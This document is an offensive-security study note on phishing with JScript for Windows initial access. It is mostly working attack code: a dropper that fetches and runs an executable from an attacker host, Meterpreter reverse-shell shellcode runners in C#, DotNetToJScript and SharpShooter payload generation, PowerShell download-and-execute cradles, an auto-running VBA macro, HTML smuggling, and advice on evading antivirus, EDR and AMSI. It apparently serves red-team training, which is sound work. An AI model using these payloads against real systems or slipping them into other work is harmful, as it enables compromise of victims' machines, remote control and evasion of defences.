---
title: Phishing with Jscript
draft: false
tags:
  - red-teaming
  - jscript
  - wsh
  - windows
  - initial-access
  - phishing
---
JScript is Microsoft's implementation of ECMAScript (JavaScript) for the Windows Script Host (WSH) environment. Unlike browser JavaScript, JScript running under WSH has direct access to the Windows API, COM objects, the filesystem, and the registry — making it a powerful vector for payload delivery.

JScript files (`.js`, `.jse`) are executed by `wscript.exe` (GUI, default) or `cscript.exe` (console). When a victim double-clicks a `.js` file, WSH executes it natively — no Office, no browser required. This means Jscript is not subject to any of the security restrictions enforced by a browser sandbox, bypassing all security settings.

**Advantages over VBA macros:**
- No requirement for Microsoft Office to be installed
- No "Enable Content" / macro security warning (WSH runs `.js` files directly)
- Can be delivered as email attachments, inside ZIPs, or via HTML smuggling
- Supports COM interop, allowing interaction with virtually any Windows API

> [!Note]
> `.js` attachments are blocked by many email gateways. Common delivery workarounds: embed in a ZIP, use HTML smuggling (see [[Client-Side Attacks]]), or rename to `.jse` (JScript Encoded).

---
# Windows Script Host (WSH) Basics

WSH provides the runtime environment for JScript and VBScript outside of browsers. Two executables handle script execution:

| Executable | Mode | Behavior |
|---|---|---|
| `wscript.exe` | GUI (default) | Runs script silently; dialog boxes appear as GUI windows |
| `cscript.exe` | Console | Runs in a terminal; `WScript.Echo` prints to stdout |

Useful WSH built-in objects:

```javascript
// WScript object — script control
WScript.Echo("Hello");               // print output
WScript.Sleep(2000);                 // sleep 2 seconds
WScript.ScriptFullName;             // full path of the current script
WScript.Arguments(0);               // first command-line argument

// WScript.Shell — run commands, read registry, shortcuts
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe", 0, false);      // run hidden
shell.RegRead("HKLM\\SOFTWARE\\..\\ProductName");
shell.ExpandEnvironmentStrings("%TEMP%");

// FileSystemObject — filesystem access
var fso = new ActiveXObject("Scripting.FileSystemObject");
fso.FileExists("C:\\file.txt");
fso.GetTempName();
```

---
# Basic JScript Dropper (detectable)

A JScript dropper downloads a payload from a remote server and executes it. No Office required — just a `.js` file the victim double-clicks.

```javascript
// dropper.js — downloads and executes a payload
var url = "http://ATTACKER_IP:ATTACKER_PORT/shell.exe"
var savePath = "C:\\Users\\Public\\shell.exe"

// Download the payload using MSXML2.XMLHTTP (WinHTTP-based)
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
	// Write binary response to disk using ADODB.Stream
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1; // 1 = binary
    Stream.Write(Object.ResponseBody); // write response to the stream
    Stream.Position = 0; // point the stream to the beginning of its content

    Stream.SaveToFile(savePath, 2); // create a file and save the content (2 = overwrite)
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run(savePath);
```

> [!Note]
> Jscript supports proxy configuration via the [_setProxy_](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms760236%28v%3dvs.85%29) method.

Setup and delivery:
```bash
# 1. Generate the payload
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe -o shell.exe

# 2. Host the payload
$ python3 -m http.server 80

# 3. Setup the listener
msf> use multi/handler
msf> set payload windows/x64/meterpreter/reverse_https
msf> set LHOST ATTACKER_IP
msf> set LPORT 443
msf> run

# 4. Deliver dropper.js to the victim (ZIP attachment, HTML smuggling, etc.)
```

> [!Warning] OPSEC
> - Writing an `.exe` to disk is highly detectable by EDR. Prefer in-memory execution (see PowerShell shellcode runner in [[Phishing with Microsoft Office]]).
> - `MSXML2.XMLHTTP` + `ADODB.Stream` is a well-known dropper pattern and is signatured by many AV solutions. Obfuscate variable names and string literals.
> - Use `C:\Users\Public\` as a drop directory — it's writable by all users and less monitored than `%TEMP%`.

---
# Shellcode Runner in C\#

The resulting payload will be a `.exe` that will execute in memory a reverse shell.

1. Open Visual Studio and create a new `Console App (.NET Framework)` project.
2. Generate a reverse shell payload:
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 EXITFUNC=thread -f csharp
```

3. Modify `Program.cs` and add the following payload:
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        // P/Invoke declarations for shellcode injection
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Shellcode generated by msfvenom or custom C2 implant
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[] {BYTES};

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

> [!Note]
> 1. Any DllImport must be placed inside the Class but outside the method used in.
> 2. Calling the APIs from C# is like our experience with PowerShell. However, we do not have to specify .NET namespaces like _[System.Runtime.InteropServices.Marshal]_ or the runtime compiled classes to invoke them.
> 3. DllImport requires importing to the C# class `System.Diagnostics` and `System.Runtime.InteropServices` namespaces. To use basic data types, we will need to import `System` namespace.

4. Compile the Solution for the target architecture, it will create a `ConsoleApp1.exe`.

We will have to select the CPU > Configuration manager:
![[Pasted image 20260702193048.png]]

We will have to choose New from the platform drop down menu and select the target architecture:
![[Pasted image 20260702193134.png]]

Next, we will have to switch from Debug mode to Release mode:
![[Pasted image 20260702193244.png]]

And we can compile our application by selecting Build > Build Solution:
![[Pasted image 20260702193332.png]]

5. Setup a listener:
```bash
msf> use multi/handler
msf> set payload windows/x64/meterpreter/reverse_https
msf> set LHOST ATTACKER_IP
msf> set LPORT 443
msf> set EXITFUNC thread
msf> run
```

6. Execute the `.exe` payload on the victim machine. A Meterpreter session will open on the listener.

> [!Warning] OPSEC
> - The standalone `.exe` is written to disk when executed on the victim. This is detectable by AV and EDR — it's best used as a stepping stone to understand the technique before moving to in-memory approaches (DotNetToJScript or Reflective Runner below).
> - `VirtualAlloc` with `RWX` (0x40) is the most-flagged memory allocation pattern. In production, allocate with `PAGE_READWRITE` (0x04) first, copy the shellcode, then flip to `PAGE_EXECUTE_READ` (0x20) with `VirtualProtect` before calling `CreateThread`.
> - The compiled `.exe` will be detected by Windows Defender without additional obfuscation — see [[AV Evasion]] for next steps.

---
# DotNetToJScript - Jscript Shellcode Runner (undetectable)

DotNetToJScript is a technique that allows executing arbitrary .NET assemblies from JScript or VBScript by abusing COM serialization. This enables running C# shellcode runners, tools like Mimikatz, or any .NET payload — entirely from a `.js` file, with no EXE dropped to disk.

> [!Note]
> This technique is for executing C# code from Jscript.

**How it works:** JScript uses `DotNetToJScript.exe` (a tool) to generate a `.js` file that, when executed, deserializes and loads a .NET assembly from a base64 blob embedded in the script. The .NET assembly then executes your payload.

Repository: https://github.com/tyranid/DotNetToJScript

1. Clone the repository on the Windows Dev Machine. The repository is a complete Visual Studio Solution with 2 Projects: one for building and compiling the C# payload and another for building and compiling the `DotNetToJScript.exe`

2. In the DotNetToJScript Project, open the `Program.cs` file and comment the following line:
```cs
/*if (Environment.Version.Major != 2)
{
    WriteError("This tool should only be run on v2 of the CLR");
    Environment.Exit(1);
}*/
```

3. Open the `TestClass.cs` file in the ExampleAssembly Project and create a C# payload using the P/Invoke technique to use Win32 APIs by importing the necessary DLLs:
```csharp
using System; // to be able to use basic data types
using System.Diagnostics; // to be able to use DllImport
using System.Runtime.InteropServices; // to be able to use DllImport

namespace ConsoleApp1
{

	[ComVisible(true)]
	public class TestClass
	{
	    // P/Invoke declarations for shellcode injection
	    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
	
	    [DllImport("kernel32.dll")]
	    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
	
	    [DllImport("kernel32.dll")]
	    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
	    
	    public TestClass()
		{
			// Shellcode generated by msfvenom or custom C2 implant
	        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 EXITFUNC=thread -f csharp
	        byte[] buf = new byte[] { /* shellcode bytes here */ };
		
		      int size = buf.Length;
		
		      IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
		
		      Marshal.Copy(buf, 0, addr, size);
		
		      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
		
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		}
	}
}
```

> [!Note]
> 1. Any DllImport must be placed inside the Class but outside the method used in.
> 2. Calling the APIs from C# is like our experience with PowerShell. However, we do not have to specify .NET namespaces like _[System.Runtime.InteropServices.Marshal]_ or the runtime compiled classes to invoke them.
> 3. DllImport requires importing to the C# class `System.Diagnostics` and `System.Runtime.InteropServices` namespaces. To use basic data types, we will need to import `System` namespace.
> 4. We can test our C# Payloads by creating a new `Console App (.NET Framework)` project in Visual Studio, placing in the `Program.cs` file the C# code, compiling it using the corresponding target architecture (this will generate a `.exe`), setting up a listener, and executing it.

4. Compile the Solution for the target architecture. This will create `DotNetToJScript.exe` and `ExampleAssembly.dll` (or `TestClass.dll`):

We will have to select the CPU > Configuration manager:
![[Pasted image 20260702193048.png]]

We will have to choose New from the platform drop down menu and select the target architecture:
![[Pasted image 20260702193134.png]]

Next, we will have to switch from Debug mode to Release mode:
![[Pasted image 20260702193244.png]]

And we can compile our application by selecting Build > Build Solution:
![[Pasted image 20260702193332.png]]

5. Generate the JScript launcher with DotNetToJScript:
```cmd
C:\> DotNetToJScript.exe TestClass.dll --lang=JScript --ver=v4 -o payload.js

# --lang: output language (JScript or VBScript)
# --ver: .NET Framework version to target (v4 = .NET 4.x)
# -o: output file
# -c ConsoleApp1.TestClass (use in case the class is not found)
```

> [!Note]
> Copy the paths from the Visual Studio to reference the files when executing the command. For example:
> ```powershell
> C:\> C:\Tools\DotNetToJScript-master\DotNetToJScript-master\DotNetToJScript\bin\Release\DotNetToJScript.exe C:\Tools\DotNetToJScript-master\DotNetToJScript-master\ExampleAssembly\bin\Release\ExampleAssembly.dll --lang=JScript --ver=v4 -o payload.js
> ```

6. The resulting `payload.js` is a self-contained JScript file that loads and runs the .NET assembly when executed. Deliver to the victim via the usual methods (ZIP attachment, HTML smuggling, email).

> [!Warning] OPSEC
> - `VirtualAlloc` with `RWX` (0x40) is the most-signatured memory allocation pattern. Use RW first, then `VirtualProtect` to flip to RX before `CreateThread`.
> - DotNetToJScript generates recognizable patterns. Obfuscate the output script (variable renaming, string concatenation, junk code).
> - The .NET CLR being loaded into `wscript.exe` is unusual behavior — some EDRs alert on this.

---
# Reflective C# Shellcode Runner (undetectable)

This method utilizes the reflective technique we have seen in the [[Reflective PowerShell]] module but using C# instead of PowerShell. We are going to compile the assembly DLL beforehand and loading directly into memory during execution.

The `runner()` method should contain the exact same shellcode injection code from the `Main()` method in ConsoleApp1:
```csharp
// Inside runner() — paste the shellcode injection block from ConsoleApp1.Main():
byte[] buf = new byte[] { /* shellcode bytes from msfvenom -f csharp */ };

int size = buf.Length;

IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
// 0x1000 = fixed 4KB page (use buf.Length for exact size)
// 0x3000 = MEM_COMMIT | MEM_RESERVE
// 0x40   = PAGE_EXECUTE_READWRITE

Marshal.Copy(buf, 0, addr, size);

IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

WaitForSingleObject(hThread, 0xFFFFFFFF);
```

> [!Note]
> The key difference between this DLL and the standalone EXE is the method signature: `public static void runner()` — it must be `public` and `static` so that PowerShell reflection can invoke it without instantiating the class.

1. Add a new `Class Library (.Net Framework)` (DLL) Project to the existing Solution for the "Shellcode Runner in `C#`" section:
![[Pasted image 20260704130318.png]]

2. Create a Class and import the necessary DLLs (the process of creating a EXE is the same as creating a DLL). Also create a runner method that must be available through reflection (public and static):
```csharp
public class Class1
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
     uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
	
	// shellcode runner available through reflection:
    public static void runner()
    {
	                // Shellcode generated by msfvenom or custom C2 implant
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[] {};

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
} 
```

3. Copy the exact content of the _Main_ method of the _ConsoleApp1_ project into the _runner_ method (We'll also need to replace the namespace imports to match those of the _ConsoleApp1_ project)

4. Compile the code in Visual Studio and generate the DLL.

5. Start a web server to host the `ps1` script:
```sh
$ python3 -m http.server 80
```

6. Start a listener:
```sh
msf> use multi/handler
msf> set LHOST ATTACKER_IP
msf> set LPORT ATTACKER_PORT
msf> set payload windows/x64/meterpreter/reverse_https
msf> set EXITFUNC thread
msf> run
```

7. Use a download cradle to download the newly created DLL as a byte array and we can interact with the DLL using reflection:
```powershell
# Downloader (detectable)
(New-Object System.Net.WebClient).DownloadFile('http://ATTACKER_IP/ClassLibrary1.dll', 'C:\Users\Offsec\ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ClassLibrary1.dll")
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)


# Full in memory (undetectable)
$data = (New-Object System.Net.WebClient).DownloadData('http://ATTACKER_IP/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

The in-memory PowerShell block from step 7 becomes the content of a `runner.ps1` hosted on the attack server. Here is the complete chain:

**`runner.ps1`** (host on the attack HTTP server):
```powershell
# runner.ps1 — downloads the compiled DLL in memory and invokes the runner() method via reflection
$data = (New-Object System.Net.WebClient).DownloadData('http://ATTACKER_IP/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

**Invoke from JScript** (place in payload.js delivered to the victim):
```javascript
// inmemory_reflective.js — downloads and executes runner.ps1 entirely in memory
var psCmd = "powershell.exe -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/runner.ps1')"";
var shell = new ActiveXObject("WScript.Shell");
shell.Run(psCmd, 0, false);   // 0 = hidden window, false = don't wait
```

**Invoke from VBA Macro** (embed in a Word document for Office-based delivery):
```vb
Sub Document_Open()
    ReflectiveRunner
End Sub

Sub AutoOpen()
    ReflectiveRunner
End Sub

Sub ReflectiveRunner()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/runner.ps1') | IEX"
    Shell str, vbHide
End Sub
```

**Attack server setup**:
```bash
# Host both the DLL and the PS1 from the same directory
$ python3 -m http.server 80
# Ensure ClassLibrary1.dll and runner.ps1 are in the served directory

# Listener
msf> use multi/handler
msf> set payload windows/x64/meterpreter/reverse_https
msf> set LHOST ATTACKER_IP
msf> set LPORT 443
msf> run
```

**Full chain**: Victim opens `.js` / `.docm` → PowerShell download cradle runs → `runner.ps1` executes → downloads `ClassLibrary1.dll` bytes into memory → reflection loads the assembly → `runner()` is called → shellcode executes in-process → Meterpreter shell arrives on the listener.

> [!Warning] OPSEC
> - The "Full in memory" PowerShell approach (using `Assembly::Load($data)`) does NOT write the DLL to disk. This is significantly harder to detect than the `DownloadFile` + `LoadFile` approach.
> - `Assembly::Load()` from a byte array is monitored by some EDR products via AMSI — apply an AMSI bypass in the PS1 script before loading the assembly if needed.
> - The `runner()` method name is visible to reflection-based detection. Rename it to something innocuous like `Initialize()` or `Configure()`.
> - Use `reverse_https` (port 443) to blend C2 traffic with normal HTTPS browsing.

---
# SharpShooter

[SharpShooter](https://github.com/mdsecactivebreach/SharpShooter) is a payload generation framework that creates JScript, HTA, and other format payloads using DotNetToJScript under the hood. It automates the full pipeline: takes shellcode → generates a ready-to-deliver `.js` or `.hta` file.

CLI usage helper: https://github.com/SYANiDE-/SuperSharpShooter

- Installation:
```bash
# Python 2 - SharpShooter (stagless payloads)
$ sudo curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
$ cd
$ sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git
$ cd SharpShooter/
$ sudo python2 -m pip install --upgrade setuptools pip==20.3.4
$ sudo pip2 install -r requirements.txt

# if pip cannot be found:
$ sudo apt install python-pip

# Python 3 - SuperSharpShooter (staging payloads)
wget https://files.pythonhosted.org/packages/17/73/615d1267a82ed26cd7c124108c3c61169d8e40c36d393883eaee3a561852/jsmin-2.2.2.tar.gz
tar xzf jsmin-2.2.2.tar.gz
cd jsmin-2.2.2
sudo python2 setup.py install

pip3 install colorama
```

1. Generate shellcode:
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 EXITFUNC=thread -f raw -o shellcode.bin
```

2. Generate a JScript payload from raw shellcode:

**Stageless payload**

```bash
$ sudo python2 SharpShooter.py --stageless --dotnetver 4 --payload js --output payload --rawscfile shellcode.bin 

# flags:
# --stageless                # in-memory execution of the Meterpreter shellcode -> embed shellcode directly (no staging)
# --dotnetver 4              # .NET 4.x target
# --payload js               # output format: JScript
# --output payload           # output filename (no extension)
# --rawscfile                # Path to raw shellcode file for stageless payloads
```

The output `payload.js` can be delivered directly, or use `--smuggle` to wrap it in an HTML smuggling page that auto-downloads the JScript when the victim visits the URL.

Setup the listener and deliver:
```bash
msf> use multi/handler
msf> set payload windows/x64/meterpreter/reverse_https
msf> set LHOST ATTACKER_IP
msf> set LPORT 443
msf> run
```

**Staging payload**

The key benefit of staging is that it provides the ability to change the executed payload in the event of failure or take down the payload following success to hide your implant which may hinder an investigation from the blue team.

> [!Note]
> Use better [SuperSharpShooter](https://github.com/ScriptIdiot/SuperSharpShooter) for staging payloads.

1. Create the payload:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.250 LPORT=443 -e x64/xor_dynamic  -b '\x00\x0a\x0d' -f csharp  > csharpsc.txt
```

2. Remove from the payload the `byte[] = {}` and leave only the bytes inside the `{}`

```bash
$ python3 SuperSharpShooter.py --dotnetver 4 --shellcode --payload js --output test --amsi amsienable --smuggle --template mcafee --delivery web --web http://192.168.45.250/test.payload --scfile ./csharpsc.txt

[*] Preview:  var entry_class = 'Shar'+'pSh'+'oote'+'r';
[*] File [output/test.js] successfully created!
          ^^ Selected delivery method will deliver this
[*] File [output/test.payload] successfully created!... 
          ^^ Selected delivery method expects this at: http://192.168.45.250/test.payload
[*] File [./output/test.js] successfully loaded !  (will be smuggled in .html)
[*] Encrypted input file with key [drpxxbgynbfqzerossbajzdofghmclwp]
[*] File [./output/test.html] successfully created !  
          ^^ Selected delivery method

# test.html will be sent to the victim (smuggle of test.js)
# test.js will be downloaded automatically once the html is opened (because smuggling)
# test.payload will be downloaded by test.js once opened (must be hosted on http server)

# SharpShooter for staging payloads have a bug and doesnt work correctly:
$ sudo python2 SharpShooter.py --dotnetver 4 --shellcode --payload js --output web --amsi amsienable --smuggle --template mcafee --delivery web --web http://192.168.45.250/web.payload --scfile payload.sharp

# flags:
# --dotnetver 4              # .NET 4.x target
# --shellcode                # Use built in shellcode execution
# --payload js               # output format: JScript
# --output payload           # output filename (no extension)
# --amsi                     # Use amsi bypass technique
# --smuggle                  # wrap in HTML smuggling page
# --template                 # HTML template to disguise the delivery page (e.g. mcafee)
# --delivery                 # staging payload delivery method (web, dns)
# --web                      # URI for web delivery
# --scfile                   # Path to shellcode file as CSharp byte array
```

Setup an HTTP server hosting the web delivery (`test.payload`) generated file:
```bash
$ cd output
$ python3 -m http.server 80
```

Setup the listener and deliver the `HTML` file:
```bash
msf> use multi/handler
msf> set payload windows/x64/meterpreter/reverse_https
msf> set LHOST ATTACKER_IP
msf> set LPORT 443
msf> run
```

---
# In-Memory Execution via PowerShell

Instead of writing to disk, use JScript to launch an encoded PowerShell command that downloads and executes the payload entirely in memory:

```javascript
// inmemory.js — executes PowerShell in-memory loader, no EXE dropped to disk
var psCommand = "powershell.exe -nop -w hidden -ep bypass -enc ";

// Base64-encoded PowerShell: IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/run.ps1')
// Generate with: [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/run.ps1')"))
var encoded = "SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9BVFRBQ0tFUl9JUC9ydW4ucHMxJyk=";

var shell = new ActiveXObject("WScript.Shell");
shell.Run(psCommand + encoded, 0, false);
```

Generate the encoded command:
```powershell
# On the attack machine — encode the download cradle
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/run.ps1')"
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

The `run.ps1` file on the attack server contains the shellcode runner (see [[Phishing with Microsoft Office#PowerShell Shellcode Runner (evade detection)]]).

> [!Note]
> When dealing with C#, we can compile the assembly before sending it to the victim and execute it in memory, which will avoid this problem entirely.

---
# JScript Encoded Files (.jse)

JScript Encoded (`.jse`) files are obfuscated versions of `.js` files encoded with Microsoft's Script Encoder. The encoding is not encryption — it's a simple encoding scheme that makes the source unreadable without decoding. However, `wscript.exe` decodes and executes them natively.

`.jse` files are useful because:
- Some email filters block `.js` but allow `.jse`
- The encoding provides basic source obfuscation
- The file appears to be a legitimate Microsoft-encoded script

Encode a `.js` file to `.jse`:
```cmd
:: Using Microsoft's Script Encoder (screnc.exe)
C:\> screnc.exe payload.js payload.jse

:: Alternative: use the screncode Python port
$ pip3 install jscencode --break-system-packages
$ python3 -c "import jscencode; open('payload.jse','w').write(jscencode.encode(open('payload.js').read()))"
```

> [!Note]
> `.jse` encoding is trivially reversible — it provides obfuscation against casual inspection, not security analysis. AV signatures often target `.jse` versions of known dropper patterns too.

---
# OPSEC Summary

> [!Warning] OPSEC
> - Always test with `cscript.exe` during development (prints errors to console). Switch to `wscript.exe` for delivery (silent, GUI dialogs only).
> - JScript running under `wscript.exe` is an unusual process making network connections — EDR behavioral rules often flag this. Parent process spoofing (spawning `explorer.exe` as parent) can help.
> - `MSXML2.XMLHTTP` + `ADODB.Stream` dropper is heavily signatured. Obfuscate COM ProgID strings: `"MSXML2.XMLHTTP"` → build the string at runtime via concatenation.
> - Prefer the in-memory PowerShell download cradle or DotNetToJScript over disk-based EXE droppers.
> - Combine with [[Mark of the Web (MotW)]] bypass techniques (deliver via ZIP or HTML smuggling) to prevent Protected Mode and SmartScreen from blocking execution.

---
# Related Notes
- [[Client-Side Attacks]] — overview of all client-side initial access vectors
- [[Phishing with Microsoft Office]] — VBA macro alternative with similar capabilities
- [[Mark of the Web (MotW)]] — bypassing Windows zone restrictions for delivery
- [[AV Evasion]] — shellcode obfuscation and AMSI bypass for the .NET/PS payloads
- [[Pretexting]] — social engineering the victim into running the `.js` file
